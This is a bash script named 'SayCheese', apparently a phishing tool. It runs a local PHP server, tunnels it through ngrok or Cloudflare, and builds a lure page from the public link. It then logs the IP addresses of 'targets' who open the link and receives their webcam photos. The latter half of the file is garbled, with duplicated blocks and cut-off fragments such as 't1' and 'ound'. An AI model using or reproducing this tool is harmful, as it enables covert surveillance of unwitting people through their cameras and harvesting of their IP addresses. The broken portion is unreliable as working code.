#!/bin/bash
# SayCheese v1.0
# coded by: WHITE HAT
# If you use any part from this code, giving me the credits. Read the Lincense!

trap 'printf "\n";stop' 2

banner() {


printf "\e[1;92m  ____              \e[0m\e[1;77m ____ _                          \e[0m\n"
printf "\e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
printf "\e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
printf "\e[1;92m              |___/ \e[0m                                 \n"

printf " \e[1;77m v1.0 coded by WHITE HAT\e[0m \n"

printf "\n"

echo " N073:> PLEASE TURN ON YOUR HOTSPOT OR ELSE YOU DONT GET LINK....!"
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Photho is receiving!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {
rm -rf ${PWD}/cloudflare-log > /dev/null 2>&1

if [[ ${PWD} == *'com.termux'* ]]; then
    termux-chroot cloudflared -url 127.0.0.1:3333 --logfile ${PWD}/cloudflare-log > /dev/null 2>&1 & sleep 2

else
cloudflared -url 127.0.0.1:3333 --logfile ${PWD}/cloudflare-log > /dev/null 2>&1 &
sleep 5
fi


printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting  server...\e[0m\n" 

sleep 3
send_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${PWD}/cloudflare-log")
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[a-zA-Z0-9./?=_%:-]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 5

link=$(curl -s -N http://localhost:4040/api/tunnels | grep -o  "https://[a-zA-Z0-9./?=_%:-]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflare\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}


payload() {

send_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${PWD}/cloudflare-log")

sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php


}

start() {


server
payload
checkfound

}

banner
dependencies
start1



server
payload
checkfound

}

banner
dependencies
start1

t1




read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
start1

t1





t1



found

}

banner
dependencies
start1

t1



ound

}

banner
dependencies
start1

t1




ose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
start1

t1



d

}

banner
dependencies
start1


1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
start1

t1



